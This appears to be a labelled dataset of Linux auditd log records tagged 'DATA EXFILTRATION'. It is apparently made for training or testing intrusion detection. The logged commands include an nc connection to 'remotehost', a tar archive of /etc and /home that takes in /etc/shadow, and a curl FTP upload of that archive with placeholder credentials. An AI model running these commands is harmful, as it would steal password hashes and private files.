DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:27.530:14563),proctitle=nc -w 3 remotehost 1234
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:28:09.565:14619),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:28:09.572:14620),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:28:09.619:14621),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_close,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:28:09.619:14622),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:09.846:14623),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:09.846:14623),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:09.846:14623),item=0,name=/usr/bin/tar,inode=1836442,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:09.846:14623),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:28:09.846:14623),argc=5,a0=tar,a1=-czf,a2=/tmp/data.tar.gz,a3=/etc,a4=/home
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:09.846:14623),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec880c120,a1=0x5eaec88219b0,a2=0x5eaec8809400,a3=0x5eaec8811670,items=2,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.416:14624),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.416:14624),item=0,name=shadow,inode=2132944,dev=08:02,mode=file,640,ouid=root,ogid=shadow,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.416:14624),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.416:14624),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5d00f4ab79d7,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.753:14625),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.753:14625),item=0,name=crontab,inode=2097529,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.753:14625),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.753:14625),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5d00f4ab8028,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.915:14626),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.915:14626),item=0,name=cron.d,inode=2097184,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.915:14626),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.915:14626),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5d00f4ab822a,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.915:14627),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.915:14627),item=0,name=sysstat,inode=2099129,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.915:14627),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.915:14627),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x5,a1=0x5d00f4adf2b0,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.915:14628),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.915:14628),item=0,name=e2scrub_all,inode=2099128,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.915:14628),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.915:14628),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x5,a1=0x5d00f4adf2b8,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.916:14629),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.916:14629),item=0,name=.placeholder,inode=2099126,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.916:14629),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.916:14629),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x5,a1=0x5d00f4adf2c4,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:28:10.916:14630),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:28:10.916:14630),item=0,name=anacron,inode=2099127,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:28:10.916:14630),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:28:10.916:14630),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x5,a1=0x5d00f4adf2d1,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28242,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=SERVICE_START,msg=audit(12/03/2025 03:30:08.820:14631),pid=1,uid=root,auid=unset,ses=unset,subj=unconfined,unit=sysstat-collect,comm=systemd,exe=/usr/lib/systemd/systemd,hostname=?,addr=?,terminal=?,res=success
DATA EXFILTRATION,type=SERVICE_STOP,msg=audit(12/03/2025 03:30:08.821:14632),pid=1,uid=root,auid=unset,ses=unset,subj=unconfined,unit=sysstat-collect,comm=systemd,exe=/usr/lib/systemd/systemd,hostname=?,addr=?,terminal=?,res=success
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:30:15.528:14635),pid=28264,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:30:15.548:14637),pid=28264,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:30:15.555:14638),pid=28264,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.171:14641),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user user:password
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.171:14641),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.171:14641),item=0,name=/usr/bin/curl,inode=1850725,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:16.171:14641),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:30:16.171:14641),argc=6,a0=curl,a1=-T,a2=/tmp/data.tar.gz,a3=ftp://remotehost,a4=--user,a5=user:password
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.171:14641),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec8812150,a1=0x5eaec880ef20,a2=0x5eaec8809400,a3=0x5eaec8813190,items=2,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.248:14642),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user user:password
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.248:14642),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:16.248:14642),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:16.248:14642),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.248:14642),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7fff8986f200,a2=0x6e,a3=0x5959ef1148d0,items=1,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.252:14643),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user user:password
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.252:14643),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:16.252:14643),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:16.252:14643),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.252:14643),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7fff8986f3f0,a2=0x6e,a3=0x5959ef1148d0,items=1,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.260:14644),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user              
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.260:14644),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:16.260:14644),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:16.260:14644),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.260:14644),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x8,a1=0x7eaa0e5fdd60,a2=0x6e,a3=0x11,items=1,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.260:14645),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user              
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:16.260:14645),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:16.260:14645),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:16.260:14645),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.260:14645),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x8,a1=0x7eaa0e5fdf50,a2=0x6e,a3=0x11,items=1,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:16.262:14646),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user              
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:16.262:14646),saddr={,saddr_fam=inet,laddr=127.0.0.53,lport=53,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:16.262:14646),arch=x86_64,syscall=connect,success=yes,exit=0,a0=0x8,a1=0x7eaa0e5ffd8c,a2=0x10,a3=0x7eaa0e5fc344,items=0,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:26.275:14647),proctitle=curl -T /tmp/data.tar.gz ftp://remotehost --user              
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:30:26.275:14647),saddr={,saddr_fam=inet,laddr=127.0.0.53,lport=53,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:26.275:14647),arch=x86_64,syscall=connect,success=yes,exit=0,a0=0x8,a1=0x7eaa0e5ffd8c,a2=0x10,a3=0x7eaa0e5fc344,items=0,ppid=28139,pid=28271,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=curl,exe=/usr/bin/curl,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:30:48.398:14650),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:30:48.408:14652),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:30:48.413:14653),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:30:48.398:14650),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:30:48.408:14652),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:30:48.413:14653),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:30:48.490:14654),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_close,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:30:48.492:14655),pid=28283,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:48.751:14656),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:48.751:14656),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:48.751:14656),item=0,name=/usr/bin/tar,inode=1836442,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:48.751:14656),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:30:48.751:14656),argc=5,a0=tar,a1=-czf,a2=/tmp/data.tar.gz,a3=/etc,a4=/home
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:48.751:14656),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec880c210,a1=0x5eaec880e730,a2=0x5eaec8809400,a3=0x5eaec8812270,items=2,ppid=28139,pid=28293,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:49.090:14657),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:49.090:14657),item=0,name=shadow,inode=2132944,dev=08:02,mode=file,640,ouid=root,ogid=shadow,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:49.090:14657),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:49.090:14657),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5dfca26569d7,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28293,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:49.434:14658),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:49.434:14658),item=0,name=crontab,inode=2097529,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:49.434:14658),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:49.434:14658),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5dfca2657028,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28293,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:49.505:14659),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:49.505:14659),item=0,name=cron.d,inode=2097184,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:49.505:14659),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:30:49.505:14659),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x3,a1=0x5dfca265722a,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=28293,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=tar,exe=/usr/bin/tar,subj=unconfined,key=PERSISTENCE
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:30:49.506:14660),proctitle=tar -czf /tmp/data.tar.gz /etc /home
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:30:49.506:14660),item=0,name=sysstat,inode=2099129,dev=08:02,mode=file,644,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:30:49.506:14660),cwd=/home/ubuntu
